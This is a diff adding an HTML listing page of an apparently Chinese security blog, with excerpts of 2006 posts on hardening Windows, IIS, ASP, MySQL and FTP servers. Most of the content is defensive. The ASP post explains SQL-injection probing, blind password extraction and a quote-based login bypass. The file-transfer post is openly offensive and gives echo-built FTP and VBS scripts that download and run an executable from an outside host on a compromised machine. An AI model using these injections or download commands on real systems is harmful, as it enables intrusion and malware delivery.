@@ -1,0 +1,466 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head>
+	<meta name="generator" content="Hugo 0.109.0"><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>白天’s Blog</title>
+
+<meta name="description" content="">
+<meta name="author" content="">
+<link rel="canonical" href="http://example.org/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.bccfefac377bc340f06c260aed1bddf49a4354816d7c570d6aac75a997986c95.css" integrity="sha256-vM/vrDd7w0DwbCYK7Rvd9JpDVIFtfFcNaqx1qZeYbJU=" rel="preload stylesheet" as="style">
+<link rel="icon" href="http://example.org/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="http://example.org/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="http://example.org/favicon-32x32.png">
+<link rel="apple-touch-icon" href="http://example.org/apple-touch-icon.png">
+<link rel="mask-icon" href="http://example.org/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" type="application/rss+xml" href="http://example.org/index.xml">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --hljs-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript><meta property="og:title" content="白天’s Blog" />
+<meta property="og:description" content="" />
+<meta property="og:type" content="website" />
+<meta property="og:url" content="http://example.org/" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="白天’s Blog"/>
+<meta name="twitter:description" content=""/>
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "Organization",
+  "name": "白天’s Blog",
+  "url": "http://example.org/",
+  "description": "",
+  "thumbnailUrl": "http://example.org/favicon.ico",
+  "sameAs": [
+      
+  ]
+}
+</script>
+</head>
+
+<body class="list" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="http://example.org/" accesskey="h" title="白天’s Blog (Alt + H)">白天’s Blog</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+        </ul>
+    </nav>
+</header>
+<main class="main"> 
+
+<article class="post-entry"> 
+  <header class="entry-header">
+    <h2>ASP安全配置不完全手册
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>从asp程序编写到服务器配置 ASP全称Active Server Pages，是微软推出的用来取代CGI（Common Gateway Interface）的动态服务器网页技术。由于ASP比较简单易学，又有微软这个强大后台的支持，所以应用比较广泛，相对来说发现的缺陷和针对各程序的漏洞也比较多。ASP可运行的服务器端平台包括：WinNT、Win2k、WinXP和Win2003，在Win98环境下装上PWS4.0也可以运行。现在我们就针对Win2k和Win2003这两个系统来谈谈ASP的安全配置。
+ASP程序安全篇： 在做安全配置前，我们先了解一下入侵者的攻击手法。现在很流行注入攻击，所谓注入攻击，就是利用提交特殊地址将ASP中引用的正常SQL语句和入侵者所需要的SQL语句一并执行，使入侵者达到入侵的目的。现在更是有一些脚本注入工具发布，使菜鸟也可以轻松完成对ASP的注入攻击。那么我们先来了解一下这些工具是怎样注入的。 首先，入侵者会对一个网站确定可不可以进行注入，假设一篇文章的地址为： http://www.scccn.com/news.asp?id=1 一般会以提交两个地址来测试，如： http://www.scccn.com/news.asp?id=1 and 1=1 http://www.scccn.com/news.asp?id=1 and 1=2 第一个地址后面加了 and 1=1，构成的SQL语句也就变为了：Select * from 表单名 where id=1 and 1=1这句话要成立就必须and前后语句都成立。那么前面的文章地址是可以访问的，后面的1=1也是客观成立的，那么第一个地址就可以正常显示；相反1=2是显然不成立的，关键就看这步了，如果提交and 1=2页面还是正常显示说明他并没有将and 1=2写入SQL语句，此站也就不存在注入漏洞；但如果提交and 1=2之后返回了错误页面则说明此站点将后面的语句带入了SQL语句并执行了，也就说明他可以进行SQL注入。（注：如果地址后面跟的是news.asp?id=‘1’就得变为news.asp?id=1’ and ‘1’=‘1来补全引号了） 那么，知道可以注入后入侵者可以做什么呢？ 这里就简单的说一下，比如提交这样的地址： http://www.scccn.com/news.asp?id=1 and exists (select * from 表名 where 列名=数据) 根据返回的正确或错误页面来判断猜的表名和列名是否正确，具体实现时是先猜表名再猜列名。当猜出表名和列名之后还可以用ASC和MID函数来猜出各列的数据。MID函数的格式为：mid(变量名,第几个字符开始读取,读取几个字符)，比如：mid(pwd,1,2)就可以从变量pwd中的第一位开始读取两位的字符。ASC函数的格式为：ASC（“字符串”），如：asc(“a”)就可以读出字母a的ASCII码了。那么实际应用的时候就可以写为：asc(mid(pwd,1,1))这样读取的就是pwd列的第一个字符的ASCII码，提交： asc(mid(pwd,1,1))&gt;97以返回的页面是否为正确页面来判断pwd列的第一个字符的ASCII码是否大于97（a的ASCII码），如果正确就再试是否小于122（z的ASCII码）……这样慢慢缩小字符的ASCII码的范围，猜到真实的ASCII码也只是时间的问题。一位一位的猜就可以得到数据库中的用户名和密码了。还有一种ASP验证缺陷——就是用户名和密码都输’or ‘1’=‘1，构造SQL语句Select * form 表单名 where username=’’ or ‘1’=‘1’ and pwd=’’ or ‘1’=‘1’就可以达到绕过密码验证的目的。 说了那么多，其实防范的方法很简单，我们把特殊字符（如and、or、’、&#34;）都禁止提交就可以防止注入了。ASP传输数据分为get和post两种， get是通过将数据添加到URL后提交的方式，post则是利用邮寄信息数据字段将数据传送到服务器。 那么，我们先来看看如何将get方式提交数据中的特殊字符过滤。首先要知道，IIS是以字符串的形式将get请求传给asp.dll的，在将数据传递给Request.QueryString之后，asp解析器会解析出Request.QueryString的信息，然后跟据&#34;&amp;“来分出各个数组内的数据。现在我们要让get方式不能提交以下字符： ‘、and、exec、insert、select、delete、update、count、*、%、chr、mid、master、truncate、char、declare 那么，防止get方式注入的代码就如下：
+If Request.QueryString&#34;&#34; Then For Each SQL_Get In Request.QueryString For SQL_Data=0 To Ubound(sql_leach_0) if instr(Request....</p>
+  </div>
+  <footer class="entry-footer"><span title='2006-02-25 16:06:27 +0000 UTC'>February 25, 2006</span>&nbsp;·&nbsp;admin</footer>
+  <a class="entry-link" aria-label="post link to ASP安全配置不完全手册" href="http://example.org/2006/02/25/aspe5ae89e585a8e9858de7bdaee4b88de5ae8ce585a8e6898be5868c/"></a>
+</article>
+
+<article class="post-entry"> 
+  <header class="entry-header">
+    <h2>浅谈网络服务器安全维护技巧
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>网络服务器的恶意网络行为包括两个方面：一是恶意的攻击行为，如拒绝服务攻击，网络病毒等等，这些行为旨在消耗服务器资源，影响服务器的正常运作，甚至服务器所在网络的瘫痪；另外一个就是恶意的入侵行为，这种行为更是会导致服务器敏感信息泄露，入侵者更是可以为所欲为，肆意破坏服务器。所以我们要保证网络服务器的安全可以说就是尽量减少网络服务器受这两种行为的影响。
+基于windows做操作系统的服务器在中国市场的份额以及国人对该操作系统的了解程度，我在这里谈谈个人对维护windows网络服务器安全的一些个人意见。
+如何避免网络服务器受网上那些恶意的攻击行为：
+(一) 构建好你的硬件安全防御系统
+选用一套好的安全系统模型。一套完善的安全模型应该包括以下一些必要的组件：防火墙、入侵检测系统、路由系统等。
+防火墙在安全系统中扮演一个保安的角色，可以很大程度上保证来自网络的非法访问以及数据流量攻击，如拒绝服务攻击等；入侵检测系统则是扮演一个监视器的角色，监视你的服务器出入口，非常智能地过滤掉那些带有入侵和攻击性质的访问。
+(二) 选用英文的操作系统
+要知道，windows毕竟美国微软的东西，而微软的东西一向都是以Bug 和 Patch多而著称，中文版的Bug远远要比英文版多，而中文版的补丁向来是比英文版出的晚，也就是说，如果你的服务器上装的是中文版的windows系统，微软漏洞公布之后你还需要等上一段时间才能打好补丁，也许黑客、病毒就利用这段时间入侵了你的系统。
+如何防止网络服务器不被黑客入侵：
+首先，作为一个黑客崇拜者，我想说一句，世界上没有绝对安全的系统。我们只可以尽量避免被入侵，最大的程度上减少伤亡。
+(一) 采用NTFS文件系统格式
+大家都知道，我们通常采用的文件系统是FAT或者FAT32，NTFS是微软Windows NT内核的系列操作系统支持的、一个特别为网络和磁盘配额、文件加密等管理安全特性设计的磁盘格式。NTFS文件系统里你可以为任何一个磁盘分区单独设置访问权限。把你自己的敏感信息和服务信息分别放在不同的磁盘分区。这样即使黑客通过某些方法获得你的服务文件所在磁盘分区的访问权限，还需要想方设法突破系统的安全设置才能进一步访问到保存在其他磁盘上的敏感信息。
+(二)做好系统备份
+常言道，“有备无患”，虽然谁都不希望系统突然遭到破坏，但是不怕一万，就怕万一，作好服务器系统备份，万一遭破坏的时候也可以及时恢复。
+(三)关闭不必要的服务，只开该开的端口
+关闭那些不必要开的服务，做好本地管理和组管理。Windows系统有很多默认的服务其实没必要开的，甚至可以说是危险的，比如：默认的共享远程注册表访问(Remote Registry Service)，系统很多敏感的信息都是写在注册表里的，如pcanywhere的加密密码等。
+关闭那些不必要的端口。一些看似不必要的端口，确可以向黑客透露许多操作系统的敏感信息，如windows 2000 server 默认开启的IIS服务就告诉对方你的操作系统是windows 2000。69端口告诉黑客你的操作系统极有可能是linux或者unix系统，因为69是这些操作系统下默认的tftp服务使用的端口。对端口的进一步访问，还可以返回该服务器上软件及其版本的一些信息，这些对黑客的入侵都提供了很大的帮助。此外，开启的端口更有可能成为黑客进入服务器的门户。
+总之，做好TCP/IP端口过滤不但有助于防止黑客入侵，而且对防止病毒也有一定的帮助。
+(四)软件防火墙、杀毒软件
+虽然我们已经有了一套硬件的防御系统，但是“保镖”多几个也不是坏事。
+(五)开启你的事件日志
+虽然开启日志服务虽然说对阻止黑客的入侵并没有直接的作用，但是通过他记录黑客的行踪，我们可以分析入侵者在我们的系统上到底做过什么手脚，给我们的系统到底造成了哪些破坏及隐患，黑客到底在我们的系统上留了什么样的后门，我们的服务器到底还存在哪些安全漏洞等等。如果你是高手的话，你还可以设置密罐，等待黑客来入侵，在他入侵的时候把他逮个正着。</p>
+  </div>
+  <footer class="entry-footer"><span title='2006-02-25 16:05:02 +0000 UTC'>February 25, 2006</span>&nbsp;·&nbsp;admin</footer>
+  <a class="entry-link" aria-label="post link to 浅谈网络服务器安全维护技巧" href="http://example.org/2006/02/25/e6b585e8b088e7bd91e7bb9ce69c8de58aa1e599a8e5ae89e585a8e7bbb4e68aa4e68a80e5b7a7/"></a>
+</article>
+
+<article class="post-entry"> 
+  <header class="entry-header">
+    <h2>八种文件上传大法
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>八种文件上传大法 本文是居于已经得到了一个有一定权限的SHELL.命令行下传送文件的其他方法. 一，TFTP
+格式：tftp -i get file.exe path/file.exe 默认存放在system32下，如果指定就存在指定的地方。
+二：ftp下载文件
+ftp下载文件一般步骤如下：
+echo open xxx.xxx.xxx.xxx &gt;ftp.txt
+echo user »ftp.txt
+echo password »ftp.txt
+echo binary »ftp.txt [可选]
+echo get srv.exe »ftp.txt
+echo bye »ftp.txt
+ftp -s:ftp.txt(这一步是关键哟)
+del ftp.txt
+这样srv.exe文件就下在下来了。保证srv.exe已经存在指定位置。
+四：写程序下载
+脚本是非常好的东西，只要把源码保存到一个文件中就能运行。所以在shell下，用echo语句直接写到一个文件中，在用相应的解释程序执行就可以啦。这里是一个程序实例的简化:
+echo Set xPost = CreateObject(“Microsoft.XMLHTTP”) &gt;webdown.vbs
+echo xPost.Open “GET”,“http://txhak.126.com/srv.exe&#34;,0 »webdown.vbs
+echo xPost.Send() »webdown.vbs
+echo Set sGet = CreateObject(“ADODB.Stream”) »webdown.vbs
+echo sGet.Mode = 3 »webdown.vbs
+echo sGet.Type = 1 »webdown.vbs
+echo sGet.Open() »webdown....</p>
+  </div>
+  <footer class="entry-footer"><span title='2006-02-25 16:03:17 +0000 UTC'>February 25, 2006</span>&nbsp;·&nbsp;admin</footer>
+  <a class="entry-link" aria-label="post link to 八种文件上传大法" href="http://example.org/2006/02/25/e585abe7a78de69687e4bbb6e4b88ae4bca0e5a4a7e6b395/"></a>
+</article>
+
+<article class="post-entry"> 
+  <header class="entry-header">
+    <h2>让IIS支持多种脚本
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>在网上看了很多文章，但支持jsp的，试了Ｎ次都没成功，今天看到&#34;孤独&#34;的&#34;jsp连接sql server 2000数据库的配置&#34;，受到启发，自己小试了一会，果然成功。但俺用的操作系统是win2k-p的，都可以用，目前俺的ＩＩＳ已支持：ASP、ASP.NET、PHP、JSP、Perl，爽！！现将简单的说一下： 一、支持ASP 支持ASP的话，在IIS下直接设置一下就行的，不用另装软件。
+二、支持ASP.NET 下载微软的Microsoft .NET Framework，直接安装。
+三、支持PHP 下载PHP For IIS的软件，安装后，在IIS中添加&#34;应用程序映射&#34;中的扩展名关连。
+四、支持JSP 1.先安装J2SDK(j2sdk-1_4_2-windows-i586.exe,下载地址)
+2.配置J2SDK环境变量 JAVA_HOME=C:\j2sdk1.4.2 CLASSPATH=C:\j2sdk1.4.2\bin;.;C:\j2sdk1.4.2\lib;C:\j2sdk1.4.2\lib\dt.jar;C:\j2sdk1.4.2\lib\tools.jar 增加PATH=C:\j2sdk1.4.2;C:\j2sdk1.4.2\bin 配置完成后重启计算机
+3.测试安装和配置是否正常 public class test{ public static void main(String args[]){ System.out.println(“This is a test program.”); } } 将以上代码保存为test.java,然后在命令提示符下输入javac test.java;java test
+4.安装Tomact(jakarta-tomcat-4.1.30.exe,下载地址)
+5.配置Tomact环境变量 CATALINA_HOME=C:\Program Files\Apache Group\Tomcat 4.1 增加CLASSPATH=C:\Program Files\Apache Group\Tomcat 4.1\common\lib\servlet.jar 配置完成后重启计算机
+6.测试JSP是否正常 启动Tomact，然后在IE中输入http://locahost:8080/ ，如果网页能正常显示就说明ＯＫ了。
+五、支持Perl 下载Perl For IIS，然后安装。
+这样你的IIS就能支持Ｎ多脚本了，对于学习和测试都有很大的帮忙。上面所需的软件基本都有下载地址。本人的测试环境：Intel815EPT&#43;CIII-1.1G&#43;HardDisk 20G&#43;SD 256M&#43;Win2k-P(SP4)</p>
+  </div>
+  <footer class="entry-footer"><span title='2006-02-25 13:36:41 +0000 UTC'>February 25, 2006</span>&nbsp;·&nbsp;admin</footer>
+  <a class="entry-link" aria-label="post link to 让IIS支持多种脚本" href="http://example.org/2006/02/25/e8aea9iise694afe68c81e5a49ae7a78de8849ae69cac/"></a>
+</article>
+
+<article class="post-entry"> 
+  <header class="entry-header">
+    <h2>经验共享：服务器安全的三大纪律
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>电子商务的兴起，使的很多中小企业都拥有了自己的服务器。对内用来建立局域网，提升办公效率;对外建立网站，更为广泛地宣传企业产品和形象，争取更多客源。但是作为网络的核心产品，服务器技术相对复杂，尤其是在病毒肆虐的网络时代，安全问题显得更加突出。笔者在公司管理服务器并检查其安全性已经有段时间了，在实际工作中积累了一些经验，希望能和大家共享。 一、增强网络整体安全
+很多网管往往在维护网络安全方面存在这样的误区，认为只要将服务器单机打好补丁，安装好防护墙、操作系统定期升级就可以安枕无忧了。可实际上，很多黑客和病毒并非直接攻击服务器，而是通过入侵其他计算机作为跳板来攻击整个网络的。目前很多网络都是通过域的方式来管理，一旦黑客或病毒成功入侵与服务器有信任关系的一台计算机，那么从这台计算机攻击服务器将会变得非常简单。所以要办证整个网络的安全要从根本来考虑。
+首先是安全管理，要从管理角度出发，利用规章制度等文字性的材料规范，约束各种针对计算机网络的行为，例如禁止员工随便下载非法程序，禁止网络管理员以外的人员进入中心机房，完善网络管理员的值班制度等等。
+其次是安全技术，要从技术角度出发，利用各种软件和硬件，各种技巧和方法来管理整个计算机网络，杀毒软件与防火墙双管齐下力保网络的安全。
+这两方面缺一不可，试想如果只有安全技术的支持而在规章制度上没有进行任何约束，即使刚开始安全做的很到位，但员工随意下载非法软件，随便关闭杀毒软件的保护的话，整个网络安全形同虚设。而只有严格的规章没有技术作为支持的话病毒和黑客也会通过网络漏洞轻松入侵。因此安全管理与安全技术两方面相辅相成，网络管理员对于这两方面都要抓，力度都要硬。
+二、加强服务器本地文件格式安全级别
+目前服务器都采用的是windows2000以上版本，所以在加强安全级别上需要利用windows2000server提供的用户权限功能，根据每个用户的特点单独地为其制定访问服务器的特殊使用权限，从而避免因使用统一的访问服务器权限而带来的安全隐患。
+为了确保服务器的安全首先要在本地文件格式上做文章，即将FAT格式转换为安全系数更高的NTFS文件格式。毕竟对于黑客来说存储在FAT格式的磁盘分区里的数据要比存储在NTFS格式的磁盘分区的数据更容易访问，也更容易破坏，另外目前所有安全软件及加密软件也都是针对NTFS格式来说的，对FAT格式的保护非常薄弱。
+另外最好使用专门的网络检测软件对整个网络的运行情况进行7*24小时的不间断监视，尤其要关注“非法入侵”和“对服务器的操作”两方面的报告，笔者做在的公司就使用IISLOCK来监视网页服务器的正常运行和MRTG来检测整个网络的流量。
+三、定期备份数据
+数据的保护是一个非常重要的问题，也许服务器的系统没有崩溃但里面存储的数据发生了丢失，这种情况所造成的损失会更大，特别对于数据库服务器来说也许存储的是几年的珍贵数据。怎么才能有效的保护数据?备份是唯一的选择。以往对于数据的备份都是采取在服务器上另外一个区建立备份文件夹甚至是建立一个备份区。不过这样备份方法有一个非常大的弊端，那就是一旦服务器的硬盘出现问题所有分区的数据都将丢失，从而备份没有了保证。按照“不要把所有鸡蛋放到同一个篮子”的理论我们应该使用单独的专门设备保存这些珍贵数据。
+使用B服务器保存A服务器的数据，同时用A服务器保存B服务器的文件，这种交叉备份的方法在一段时间非常流行。另外还有一个有效的方法就是使用磁带来保存珍贵数据，不过这样的投资会比较大。
+目前笔者所在公司所采用的备份方式是通过网络存储设备NAS来保存的，将单独的NAS设备连接到网络中，定期通过工具将珍贵数据写入到NAS的硬盘中，由于NAS设备自身使用了RAID方式进行数据的冗余，所以数据得到了最好的保证。
+但是数据备份也存在巨大的安全漏洞，因为备份好的数据也有可能被盗窃，所以在备份时应该对备份介质进行有效的密码保护，必要时还需要使用加密软件对这些数据进行加密，这样即使数据被盗也不会出现数据泄露的问题。</p>
+  </div>
+  <footer class="entry-footer"><span title='2006-02-25 13:28:09 +0000 UTC'>February 25, 2006</span>&nbsp;·&nbsp;admin</footer>
+  <a class="entry-link" aria-label="post link to 经验共享：服务器安全的三大纪律" href="http://example.org/2006/02/25/e7bb8fe9aa8ce585b1e4baabefbc9ae69c8de58aa1e599a8e5ae89e585a8e79a84e4b889e5a4a7e7baaae5be8b/"></a>
+</article>
+
+<article class="post-entry"> 
+  <header class="entry-header">
+    <h2>ASP木马Webshell安全解决办案
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>ASP木马、Webshell之安全防范解决办法正文内容：
+注意：本文所讲述之设置方法与环境：适用于Microsoft Windows 2000 Server/Win2003 SERVER IIS5.0/IIS6.0 1、首先我们来看看一般ASP木马、Webshell所利用的ASP组件有那些？我们以海洋木马为列：
+＜object runat=&#34;server&#34; id=&#34;ws&#34; scope=&#34;page&#34; classid=&#34;clsid:72C24DD5-D70A-438B-8A42-98424B88AFB8&#34;＞ ＜/object＞ ＜object runat=&#34;server&#34; id=&#34;ws&#34; scope=&#34;page&#34; classid=&#34;clsid:F935DC22-1CF0-11D0-ADB9-00C04FD58A0B&#34;＞ ＜/object＞ ＜object runat=&#34;server&#34; id=&#34;net&#34; scope=&#34;page&#34; classid=&#34;clsid:093FF999-1EA0-4079-9525-9614C3504B74&#34;＞ ＜/object＞ ＜object runat=&#34;server&#34; id=&#34;net&#34; scope=&#34;page&#34; classid=&#34;clsid:F935DC26-1CF0-11D0-ADB9-00C04FD58A0B&#34;＞ ＜/object＞ ＜object runat=&#34;server&#34; id=&#34;fso&#34; scope=&#34;page&#34; classid=&#34;clsid:0D43FE01-F093-11CF-8940-00A0C9054228&#34;＞ ＜/object＞ shellStr=&#34;Shell&#34; applicationStr=&#34;Application&#34; if cmdPath=&#34;wscriptShell&#34; set sa=server.createObject(shellStr&amp;&#34;.&#34;&amp;applicationStr;) set streamT=server.createObject(&#34;adodb.stream&#34;) set domainObject = GetObject(&#34;WinNT://.&#34;) 以上是海洋中的相关代码，从上面的代码我们不难看出一般ASP木马、Webshell主要利用了以下几类ASP组件： ① WScript.Shell (classid:72C24DD5-D70A-438B-8A42-98424B88AFB8) ② WScript.Shell.1 (classid:F935DC22-1CF0-11D0-ADB9-00C04FD58A0B) ③ WScript.Network (classid:093FF999-1EA0-4079-9525-9614C3504B74) ④ WScript.Network.1 (classid:093FF999-1EA0-4079-9525-9614C3504B74) ⑤ FileSystem Object (classid:0D43FE01-F093-11CF-8940-00A0C9054228) ⑥ Adodb.stream (classid:{00000566-0000-0010-8000-00AA006D2EA4}) ⑦ Shell....</p>
+  </div>
+  <footer class="entry-footer"><span title='2006-02-25 13:24:40 +0000 UTC'>February 25, 2006</span>&nbsp;·&nbsp;admin</footer>
+  <a class="entry-link" aria-label="post link to ASP木马Webshell安全解决办案" href="http://example.org/2006/02/25/aspe69ca8e9a9acwebshelle5ae89e585a8e8a7a3e586b3e58a9ee6a188/"></a>
+</article>
+
+<article class="post-entry"> 
+  <header class="entry-header">
+    <h2>用SQL建立MySQL用户和相应权限的方法
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>好像phpMyADMIN还没有这个功能,但可以用phpMyAdmin通过输入语句的方法建立用户,或者一般的图形界面的SQL管理程序也可以建立和编辑用户. 这里只说使用GRANT语句的方法,当然还有直接修改MySQL表的方法,不过很麻烦,用的人不多~ 前提是有MySQL root权限 例子:建立另一个超级用户(所有权限)的方法 GRANT ALL ON . TO username@localhost IDENTIFIED BY ‘password’ WITH GRANT OPTION
+localhost是主机名,也可以是IP,用于限定这个用户是否可以远程连接.还可以用通配符&#34;%&#34;,比如%.im286.com,或者202.97.224.% WITH GRANT OPTION用于指定该用户可以使用GRANT语句将权限授予别人/没有这个选项就不可以 . 中第一个星星是数据库名(*为所有数据库),第二个星星是表名(*为前面数据库下的所有表) ALL 是指全部语句的操作权限(经常看到虚拟主机等的用户没有DROP权限,就是这里做了手脚)
+语法大概就是这样吧.
+例子:建立一个只能可以操作数据库im286的账号im286并可以远程连接,但不能使用GRANT. GRANT ALL ON im286.* TO im286 IDENTIFIED BY ‘password’ (这就是一般免费空间或虚拟主机上的用户数据库权限,但没有远程连接)
+例子:建立一个只能使用SELECT,INSERT,CREATE,DELETE,UPDATE语句的用户,不能远程连接 GRANT SELECT,INSERT,DELETE,UPDATE,CREATE ON dbname.* TO username@localhost IDENTIFIED BY ‘password’;
+已建立的用户,可以用REVOKE语句收回他的权限,然后用phpMyAdmin打开mysql-&gt;user,找到那个用户名,点左边第二个的删除.用户就被完全删除了.
+另外上面的dbname 为数据库名 username 为用户名 password 为密码 不能用中文
+如果你直接修改相关user或priv表,可以看到的权限更多,比如关闭服务器的权限,线程控制权限,reset权限等(不说了,呵呵)
+运行这些语句的方法就是,在phpMyAdmin里,找一个可以贴代码的框,把代码贴进去运行就行了.当然也可以做个php小程序
+原理: mysql_connect(…); mysql_select_db…(); mysql_query(“GRANT ….”);</p>
+  </div>
+  <footer class="entry-footer"><span title='2006-02-25 13:22:58 +0000 UTC'>February 25, 2006</span>&nbsp;·&nbsp;admin</footer>
+  <a class="entry-link" aria-label="post link to 用SQL建立MySQL用户和相应权限的方法" href="http://example.org/2006/02/25/e794a8sqle5bbbae7ab8bmysqle794a8e688b7e5928ce79bb8e5ba94e69d83e99990e79a84e696b9e6b395/"></a>
+</article>
+
+<article class="post-entry"> 
+  <header class="entry-header">
+    <h2>FTP服务器架设－－安全篇
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>既然是公网ＦＴＰ服务器，就难免会遭遇一些恶意攻击，轻则丢失文件，重则造成ＦＴＰ服务器甚至整个系统崩溃。怎样才能最大限度地保证它的安全性呢？
+一、操作系统的选择
+ＦＴＰ服务器首先是基于操作系统而运作的，因而操作系统本身的安全性就决定了ＦＴＰ服务器安全性的级别。虽然Ｗｉｎｄｏ
+ｗｓ ９８／Ｍｅ一样可以架设ＦＴＰ服务器，但由于其本身的安全性就不强，易受攻击，因而最好不要采用。Ｗｉｎｄｏｗｓ ＮＴ就像鸡肋，不用也罢。最好采用Ｗｉｎｄｏｗｓ ２０００及以上版本，并记住及时打上补丁。至于Ｕｎｉｘ、Ｌｉｎｕｘ，则不在讨论之列。
+二、使用防火墙
+端口是计算机和外部网络相连的逻辑接口，也是计算机的第一道屏障，端口配置正确与否直接影响到主机的安全，一般来说，仅打开你需要使用的端口，将其他不需要使用的端口屏蔽掉会比较安全。限制端口的方法比较多，可以使用第三方的个人防火墙，如天网个人防火墙等，这里只介绍Ｗｉｎｄｏｗｓ自带的防火墙设置方法。
+１．利用ＴＣＰ／ＩＰ筛选功能
+在Ｗｉｎｄｏｗｓ ２０００和Ｗｉｎｄｏｗｓ ＸＰ中，系统都带有ＴＣＰ／ＩＰ筛选功能，利用它可以简单地进行端口设置。以Ｗｉｎｄｏｗｓ ＸＰ为例，打开“本地连接”的属性，在“常规”选项中找到“Ｉｎｔｅｒｎｅｔ协议（ＴＣＰ／ＩＰ）”，双击它打开该协议的属性设置窗口。点击右下方的“高级”按钮，进入“高级ＴＣＰ／ＩＰ设置”。在“选项”中选中“ＴＣＰ／ＩＰ筛选”并双击进入其属性设置。这里我们可以设置系统只允许开放的端口，假如架设的ＦＴＰ服务器端口为２１，先选中“启用ＴＣＰ／ＩＰ筛选（所有适配器）”，再在ＴＣＰ端口选项中选择“只允许”，点“添加”，输入端口号２１，确定即可。这样，系统就只允许打开２１端口。要开放其他端口，继续添加即可。这可以有效防止最常见的１３９端口入侵。缺点是功能过于简单，只能设置允许开放的端口，不能自定义要关闭的端口。如果你有大量端口要开放，就得一个个地去手工添加，比较麻烦。 ２．打开Ｉｎｔｅｒｎｅｔ连接防火墙
+对于Ｗｉｎｄｏｗｓ ＸＰ系统，自带了“Ｉｎｔｅｒｎｅｔ连接防火墙”功能，与ＴＣＰ／ＩＰ筛选功能相比，设置更方便，功能更强大。除了自带防火墙端口开放规则外，还可以自行增删。在控制面板中打开“网络连接”，右击拨号连接，进入“高级”选项卡，选中“通过限制或阻止来自Ｉｎｔｅｒｎｅｔ的对此计算机的访问来保护我的计算机和网络”，启用它。系统默认状态下是关闭了ＦＴＰ端口的，因而还要设置防火墙，打开所使用的ＦＴＰ端口。点击右下角的“设置”按钮进入“高级设置”，选中“ＦＴＰ服务器”，编辑它。由于ＦＴＰ服务默认端口是２１，因而除了ＩＰ地址一栏外，其余均不可更改。在ＩＰ地址一栏中填入服务器公网ＩＰ，确定后退出即可即时生效。如果架设的ＦＴＰ服务器端口为其他端口，比如２２，则可以在“服务”选项卡下方点“添加”，输入服务器名称和公网ＩＰ后，将外部端口号和内部端口号均填入２２即可。
+三、对ＩＩＳ、Ｓｅｒｖ－Ｕ等服务器软件进行设置
+除了依靠系统提供的安全措施外，就需要利用ＦＴＰ服务器端软件本身的设置来提高整个服务器的安全了。
+１．ＩＩＳ的安全性设置
+１）及时安装新补丁
+对于ＩＩＳ的安全性漏洞，可以说是“有口皆碑”了，平均每两三个月就要出一两个漏洞。所幸的是，微软会根据新发现的漏洞提供相应的补丁，这就需要你不断更新，安装最新补丁。
+２）将安装目录设置到非系统盘，关闭不需要的服务
+一些恶意用户可以通过ＩＩＳ的溢出漏洞获得对系统的访问权。把ＩＩＳ安放在系统分区上，会使系统文件与ＩＩＳ同样面临非法访问，容易使非法用户侵入系统分区。另外，由于ＩＩＳ是一个综合性服务组件，每开设一个服务都将会降低整个服务的安全性，因而，对不需要的服务尽量不要安装或启动。
+３）只允许匿名连接
